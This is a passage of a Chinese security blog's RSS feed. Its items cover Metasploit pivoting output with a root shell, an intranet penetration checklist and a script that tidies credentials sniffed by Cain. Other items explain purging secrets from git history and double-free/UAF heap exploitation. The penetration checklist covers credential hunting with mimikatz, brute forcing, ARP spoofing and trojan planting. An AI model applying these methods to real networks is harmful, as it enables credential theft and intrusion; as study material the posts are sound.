+[*] Command shell session 4 opened (Local Pipe -&amp;gt; Remote Pipe) 
+pwd
+/
+id
+uid=0(root) gid=0(root)
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 08:00:27:56:f1:7c  
+          inet addr:8.8.8.9  Bcast:8.8.8.255  Mask:255.255.255.0
+          inet6 addr: fe80::a00:27ff:fe56:f17c/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:10843 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:2779 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:1081842 (1.0 MB)  TX bytes:661455 (645.9 KB)
+          Base address:0xd010 Memory:f0000000-f0020000 
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:18161 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:18161 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:5307479 (5.0 MB)  TX bytes:5307479 (5.0 MB)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;翻译自:https://pentest.blog/explore-hidden-networks-with-double-pivoting/&lt;/p&gt;
+</description>
+        <pubDate>Thu, 23 Feb 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/msf/2017/02/23/%E5%A4%9A%E9%87%8D%E8%BD%AC%E5%8F%91%E6%B8%97%E9%80%8F%E9%9A%90%E8%97%8F%E5%86%85%E7%BD%91/</link>
+        <guid isPermaLink="true">http://localhost:4000/msf/2017/02/23/%E5%A4%9A%E9%87%8D%E8%BD%AC%E5%8F%91%E6%B8%97%E9%80%8F%E9%9A%90%E8%97%8F%E5%86%85%E7%BD%91/</guid>
+        
+        <category>pivoting</category>
+        
+        <category>pentest</category>
+        
+        <category>msf</category>
+        
+        <category>ssh</category>
+        
+        
+        <category>msf</category>
+        
+      </item>
+    
+      <item>
+        <title>内网渗透流程</title>
+        <description>&lt;p&gt;假设已有webshell,无本地管理员权限&lt;/p&gt;
+
+&lt;h3 id=&quot;step0-获取本地管理员权限&quot;&gt;Step0 获取本地管理员权限&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;各种exp尝试,如果失败免杀再试
+2&amp;gt;本机配置文件,敏感文件查找
+    a)数据库等配置文件
+        https://github.com/3xp10it/bat/tree/master/get_web_config_bat
+    b)psexec.exe[找文本内容为-u xx\xxx -p xxx的文件]
+      cain.exe[找pop3.lst,http.lst,smtp.lst,ftp.lst文件]
+      mimikatz.exe[找mimikatz.txt]
+      (win下找文件可参考http://3xp10it.cc/web/2016/05/20/%E6%96%87%E4%BB%B6%E4%B8%80%E9%94%AE%E6%89%93%E5%8C%85/)
+3&amp;gt;内网机器扫描开放端口情况,弱口令爆破
+    (webshell下或reGeorg代理后用扫描器扫,如果失败则用msf生成马上传后用扫描模块,或者用hydra for win,或者用hscan,
+    或者用scanline,或者用superscan命令行,优选scanline)
+    eg.扫到一台1433 sa空口令,可用:
+    a)菜刀中配置数据库连接并在菜刀中通过数据库执行命令,有时这个会失败,可能是菜刀的问题,如果失败可用下面3种
+    b)sqltools在proxyfier+reGeorg下执行命令
+        http://www.moonsec.com/post-322.html[用前要谨慎,或许有毒]
+    c)navicat在proxyfier+reGeorg下执行菜刀中的数据库查询命令
+    d)ssh反向代理[需要有一台公网ip机器开ssh服务,可在目标机器不能使用reGeorg等socket转发脚本时使用]
+        https://github.com/louchaooo/louchaooo.github.io/issues/44
+        [win开ssh服务:http://www.cnblogs.com/xred/archive/2012/04/21/2461627.html]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;step-1-获取域控管理员权限&quot;&gt;Step 1 获取域控管理员权限&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;找域控
+2&amp;gt;找域控登录过的机器
+3&amp;gt;抓密码
+4&amp;gt;嗅探口令
+5&amp;gt;dns+arp欺骗布置网马
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Sat, 18 Feb 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/web/2017/02/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/</link>
+        <guid isPermaLink="true">http://localhost:4000/web/2017/02/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/</guid>
+        
+        <category>域渗透</category>
+        
+        <category>内网渗透</category>
+        
+        
+        <category>web</category>
+        
+      </item>
+    
+      <item>
+        <title>cain口令整理脚本</title>
+        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cain嗅探到的口令存放在cain目录下的lst文件中,包括pop3.lst,http.lst,smtp.lst,imap.lst,ftp.lst...等,脚本用法如下:
+eg.
+    用法1:
+        python3 getCainKey.py pop3.lst
+    用法2:
+        from exp10it import getCainKey
+        getCainKey(lstFile)
+
+在同目录下生成pop3.lst-cainOutPut.txt为整理后的结果
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;code&quot;&gt;Code&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#参数为文件名
+#也即cain目录下的.lst文件[pop3.lst,http.lst,smtp.lst,imap.lst,ftp.lst,...等包含用户名口令的文件]
+#效果为在程序当前目录下生成一个xxx-cainOutPut.txt为整理后的文件
+import re
+import sys
+with open(sys.argv[1],&quot;r+&quot;) as f:
+    allLines=f.readlines()
+AddedLines=[]
+for eachLine in allLines:    
+    #a=re.search(r&quot;[\S]+\s+-\s+[\S]+\s+[\S]+\s+[\S]+\s+([\S]+)\s+([\S]+)\s+[\S]+\s&quot;,eachLine,re.I)
+    a=re.search(r&quot;[\S]+\s+-\s+[\S]+\s+[\S]+\s+[\S]+\s+([\S]+)\s+([\S]+).*\s&quot;,eachLine,re.I)
+    if a:
+        userField=a.group(1)
+        passField=a.group(2)
+        string2write=userField+&quot;:&quot;+passField+&quot;\n&quot;
+        print(string2write)
+        if string2write not in AddedLines:
+            shouldWrite=1
+            for each in AddedLines:
+                if each[:len(userField)]!=userField: 
+                    continue
+                else:
+                    if passField==each.split(&quot;:&quot;)[1][:-1]:
+                        shouldWrite=0
+                    break
+            if shouldWrite==1:
+                AddedLines.append(string2write)
+                with open(sys.argv[1]+&quot;-cainOutPut.txt&quot;,&quot;a+&quot;) as f:
+                    f.write(string2write)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;link&quot;&gt;Link&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/3xp10it/mytools/master/getCainKey.py&quot;&gt;getCainKey&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;attention&quot;&gt;Attention&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;使用cain过一段时间后如果要重新sniffe+arp需要在arp选项卡下重新扫描网络,重新设置arp欺骗时伪造的ip,然后再打开arp欺
+骗开关,否则如果有机器重启后ip发生变化则不能欺骗到变化了ip的机器.另外实施arp欺骗时如果设置伪造ip为路由器所在
+ip[eg.192.168.1.1]容易造成网络堵塞,造成内网无法访问互联网,也难以嗅探到密码,一般可将伪造ip设置为内网的非路由器的
+如mysql,mssql,imap,pop3,smtp等服务器的ip
+
+一般在访问一个https网站时经常出现说这个网站出错了,需要将url添加到信任才可访问,这种情况很有可能就是由于目标服务
+器所在网络被sniffe+arp欺骗了,由cain在中间提供并非官方的cert证书,浏览器检测到cert异常才会提示网站访问出错,需要添
+加信任才可访问.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Fri, 17 Feb 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/python/2017/02/17/cain%E5%8F%A3%E4%BB%A4%E6%95%B4%E7%90%86%E8%84%9A%E6%9C%AC/</link>
+        <guid isPermaLink="true">http://localhost:4000/python/2017/02/17/cain%E5%8F%A3%E4%BB%A4%E6%95%B4%E7%90%86%E8%84%9A%E6%9C%AC/</guid>
+        
+        <category>cain</category>
+        
+        <category>python</category>
+        
+        
+        <category>python</category>
+        
+      </item>
+    
+      <item>
+        <title>删除github项目历史版本中的敏感文件</title>
+        <description>&lt;h3 id=&quot;steps&quot;&gt;Steps&lt;/h3&gt;
+
+&lt;p&gt;eg.删除https://www.github.com/3xp10it/MyToolKit项目历史版本中敏感文件&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.cd /tmp &amp;amp;&amp;amp; git clone https://github.com/dxa4481/truffleHog.git &amp;amp;&amp;amp; cd truffleHog
+2.pip3 install -r requirements.txt
+3.python3 truffleHog.py https://www.github.com/3xp10it/MyToolKit
+    or
+  python3 truffleHog.py https://github.com/3xp10it/MyToolKit.git
+  此时找到了有敏感密码的文件my_bing_domains_v1_alone.py
+4.cd /tmp &amp;amp;&amp;amp; git clone https://github.com/3xp10it/MyToolKit.git &amp;amp;&amp;amp; cd MyToolKit
+5.cp my_bing_domains_v1_alone.py /tmp/
+  这里是为了备份这个有敏感密码的文件
+6.git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch my_bing_domains_v1_alone.py' --prune-empty --tag-name-filter cat -- --all
+  这里是为了删除所有commit中的my_bing_domains_v1_alone.py文件
+7.git push origin --force --all
+8.git push origin --force --tags
+9.git for-each-ref --format='delete %(refname)' refs/original | git update-ref --stdin
+10.git reflog expire --expire=now --all
+11.git gc --prune=now
+12.python3 /tmp/truffleHog/truffleHog.py https://www.github.com/3xp10it/MyToolKit
+  这里是为了验证是否成功清除历史版本中的敏感文件
+13.如果有需要,将备份的my_bing_domains_v1_alone.py有关密码的部分代码修改成没有明文密码后上传到github 
+    cp /tmp/my_bing_domains_v1_alone.py /tmp/MyToolKit/
+    cd /tmp/MyToolKit
+    git add .
+    git commit -a -m &quot;clean passwords&quot;
+    git push -u origin master
+    如果没有必要将my_bing_domains_v1_alone.py文件上传则这一步不需要,例如my_bing_domains_v1_alone.py文件是一个纯
+    配置文件而没有关键代码的时候,这时直接将所有历史版本中的该文件删除即可
+14.done
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;reffer&quot;&gt;Reffer&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://help.github.com/articles/removing-sensitive-data-from-a-repository/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Mon, 16 Jan 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/auxilary/2017/01/16/%E5%88%A0%E9%99%A4github%E9%A1%B9%E7%9B%AE%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E4%B8%AD%E7%9A%84%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/</link>
+        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/01/16/%E5%88%A0%E9%99%A4github%E9%A1%B9%E7%9B%AE%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E4%B8%AD%E7%9A%84%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/</guid>
+        
+        <category>git</category>
+        
+        <category>github</category>
+        
+        <category>truffleHog</category>
+        
+        
+        <category>auxilary</category>
+        
+      </item>
+    
+      <item>
+        <title>UAF漏洞</title>
+        <description>&lt;p&gt;0x00 理解&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;uaf漏洞叫作&quot;释放后重引用&quot;漏洞,触发漏洞在于&quot;重引用&quot;这个动作,而重引用之前要通过&quot;占坑&quot;方式来修改要&quot;重引用&quot;的指针对
+应内存中的数据,然后&quot;重引用&quot;到变化了的构造好的数据,导致执行任意代码
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Thu, 12 Jan 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/01/12/UAF%E6%BC%8F%E6%B4%9E/</link>
+        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/01/12/UAF%E6%BC%8F%E6%B4%9E/</guid>
+        
+        <category>uaf</category>
+        
+        
+        <category>二进制</category>
+        
+      </item>
+    
+      <item>
+        <title>Double Free漏洞</title>
+        <description>&lt;h3 id=&quot;0x00-link&quot;&gt;0x00 Link&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.Double Free浅析
+http://php.ph/wydrops/drops/Double%20Free%E6%B5%85%E6%9E%90.pdf
+2.freenote_x64堆漏洞double free利用
+http://fanrong1992.github.io/2016/05/26/freenote-x64%E5%A0%86%E6%BC%8F%E6%B4%9Edouble-free%E5%88%A9%E7%94%A8/
+3.freebuf CVE-2014-0502分析
+http://www.freebuf.com/articles/network/27118.html
+4.上面3中内含的Corelan ROPdb[基于单个dll收集通用rop链]
+https://www.corelan.be/index.php/security/corelan-ropdb/    
+5.目前认为:
+    alloc(HeapAlloc,malloc)对应unlink
+    free对应link
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x01-free对应link&quot;&gt;0x01 free对应link&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c&quot;&gt;一个doble free的例子&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----------------start of fastbin_dup.c-----------------
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+
+int main()
+{
+	printf(&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;);
+
+	printf(&quot;Allocating 3 buffers.\n&quot;);
+	int *a = malloc(8);
+	int *b = malloc(8);
+	int *c = malloc(8);
+
+	printf(&quot;1st malloc(8): %p\n&quot;, a);
+	printf(&quot;2nd malloc(8): %p\n&quot;, b);
+	printf(&quot;3rd malloc(8): %p\n&quot;, c);
+
+	printf(&quot;Freeing the first one...\n&quot;);
+	free(a);
+
+	printf(&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);
+	// free(a);
+
+	printf(&quot;So, instead, we'll free %p.\n&quot;, b);
+	free(b);
+
+	printf(&quot;Now, we can free %p again, since it's not the head of the free list.\n&quot;, a);
+	free(a);
+
+	printf(&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n&quot;, a, b, a, a);
+	printf(&quot;1st malloc(8): %p\n&quot;, malloc(8));
+	printf(&quot;2nd malloc(8): %p\n&quot;, malloc(8));
+	printf(&quot;3rd malloc(8): %p\n&quot;, malloc(8));
+}
+-------------------end of fastbin_dup.c-----------------
+
+gcc -o 1 fastbin_dup.c
+./1
+----------------output---------------
+This file demonstrates a simple double-free attack with fastbins.
+Allocating 3 buffers.
+1st malloc(8): 0x2209420
+2nd malloc(8): 0x2209440
+3rd malloc(8): 0x2209460
+Freeing the first one...
+If we free 0x2209420 again, things will crash because 0x2209420 is at the top of the free list.
+So, instead, we'll free 0x2209440.
+Now, we can free 0x2209420 again, since it's not the head of the free list.
+Now the free list has [ 0x2209420, 0x2209440, 0x2209420 ]. If we malloc 3 times, we'll get 0x2209420 twice!
+1st malloc(8): 0x2209420    (markA)
+2nd malloc(8): 0x2209440    (markB)
+3rd malloc(8): 0x2209420    (markC)
+-------------end of output-----------
+
+由结果分析如下:
+
+1.如果连续free(a),也即对应上面注释掉的变成不注释,这样会出错,因为在执行free函数时,free对应空闲堆块的link,也即对
+  应空闲堆块链入空表,在第2次free动作时,检测到空表中的相邻空闲堆块是自己(同一个空闲堆块),于是系统报错
+  (double free error)
+2.按照上面的代码中的再次free动作[free对应link,将空闲堆块链入空表],第2次free(a)完成后空表如下:
+  [freelist是头进尾出]
+  freelist[2]=========a[第2次free(a),markC]=========b[markB]========a[第1次free(a),markA]
+     |______________________________________________________________|
+  在第2次free(a)的时候系统看了下最近的在空表上的空闲堆块不是自己,所以情况正常,不会是Double Free,所以第2次
+  free(a)正常没有出错
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;上面这个例子放在这里是要说明free对应link,以及野指针的用处,malloc后再free,而free之后没有置Null的指针是野指针,详情可见下面链接,这里
+的代码并没有直观的看出Double Free是如何被利用在控制代码执行流程的
+&lt;a href=&quot;https://zhidao.baidu.com/question/6536098.html&quot;&gt;野指针&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;下面分析wooyun文章中的Double Free浅析,这才是Double Free用以控制代码执行的一种直观的利用方法
+&lt;a href=&quot;http://php.ph/wydrops/drops/Double%20Free浅析.pdf&quot;&gt;Double Free栈析&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;0x02-double-free漏洞的利用方法&quot;&gt;0x02 Double Free漏洞的利用方法&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;上面Doubl Free栈析链接中对应如下操作:
+
+1.malloc(504)分配第1个堆块,实际分配504+8=512B大小的堆块,在下面标记为504堆块
+2.p=malloc(512)分配第2个堆块,实际分配512+8=520大小的堆块,在下面标记为512堆块
+    |xxxxxxxx504xxxxxxxxx|xxx(p)xxxxxx512xxxxxxxxxxx|
+    第2个堆块malloc得到的指针为p,p在距离第1个堆块块首504+8+8=512+8=0x200+8偏移位置处
+3.free504大小的堆块
+    freelist[64]=============504堆块
+4.free512大小的堆块,也即free(p),第1次free(p)
+    freelist[64]=============504堆块
+
+    freelist[65]=============512堆块
+        
+    此时p指针被释放,p指针成为野指针
+    由于504堆块和512堆块现在都是空闲堆块,而且在内存空间中相邻,于是堆管理器将这两个堆块合并成一个新的堆块,大小为
+    512+520=1032,1032&amp;gt;1024,于是这个合并的新的堆块将被链入freelist[0]所在的双向链表中
+5.malloc(768),768+8=776&amp;lt;1024,776=97x8
+    按理这时malloc(768)会从freelist[97]所在链表中分配出一个空闲堆块,不过可能是90%以上的情况下,这时候的
+    freelist[97]所在的链表中并没有其他空闲堆块,这样就从freelist[0]中分配得到刚才合并的新堆块[1032&amp;gt;776]
+    0x300=768
+6.在malloc(768)得到的新内存空间中布置如下数据:
+
+chunk chunk的指针ptr                                                        chunk尾         野指针p 
+|      |                                                                     |              |
++----------------------------------------------------------------------------------------------------+
+0x0    +   0x1f9   +   0x0804bfc0-0xc  +  0x0804bfc0-0x8  +  'a'x(0x200-24)  +  0x000001f8  +  0x108
+|head  |fake head  |fake fd            |fake bk           |data              |fake head     |        |
++----------------------------------------------------------------------------------------------------+
+       |&amp;lt;---------------------------------0x1f7-----------------------------&amp;gt;|&amp;lt;-------0x108---------&amp;gt;|
+
+7.上面布置数据后相当于将chunk堆块伪造成空闲堆块,而野指针p所在堆块没有伪造成空闲堆块,是占用态堆块
+    chunk堆块被伪造成空闲堆块后将链入freelist[64](0x200=512=64x8),伪造的关键在于如下动作:
+    a)将堆块的self size和pre chunk size字段伪造为对应内存长度
+    b)将决定当前堆块是否是空闲态或占用态对应的字段伪造好
+    c)pre chunk size为0代表前一个堆块是占用态堆块,不是空闲堆块
+    d)堆块的flag标志位有3位,最低位表示前一个堆块是否是占用态,c)和d)共同决定前一个堆块是否是空闲堆块
+
+8.free(p),第2次free[Double Free],这时由于系统认为p前面的堆块是空闲堆块,于是两个堆块发生合并
+    对应freelist[64]所在的链表中的chunk堆块要unlink下来,而一个空闲堆块的unlink对应一个DWORD SHOOT机会,也即对应
+    这里的[fake fd]=fake bk,也即将0x0804bfc0-0x8写入到0x0804bfc0-0xc所在内存中
+    
+
+小结:
+    Double Free的利用关键是要通过第2次的free动作制造出一个unlink的结果,这里采用的方法是通过在第2次的free动作前
+    伪造即将进行第2次free动作的堆块的相邻(前一个)的堆块为空闲堆块,这样再进行第2次free动作时就会制造出两个空闲堆
+    块合并而产生一个堆块的unlink,而一个unlink对应一次DWORD SHOOT,由此看出无论是怎么变化,关键是要出现unlink,而
+    free对应link,这里在free(第2次p的free)后先unlink再link,所以free是有机会产生unlik的,只要这个free的堆块旁边有
+    空闲的堆块
+
+    Double Free可以利用的根源来自于野指针,可以将Double Free看作一种UAF,UAF可以利用的根源也是野指针
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Mon, 09 Jan 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/01/09/Double-Free%E6%BC%8F%E6%B4%9E/</link>
+        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/01/09/Double-Free%E6%BC%8F%E6%B4%9E/</guid>
+        
+        <category>漏洞战争</category>
+        
+        
+        <category>二进制</category>
+        
+      </item>
+    
+  </channel>
+</rss>
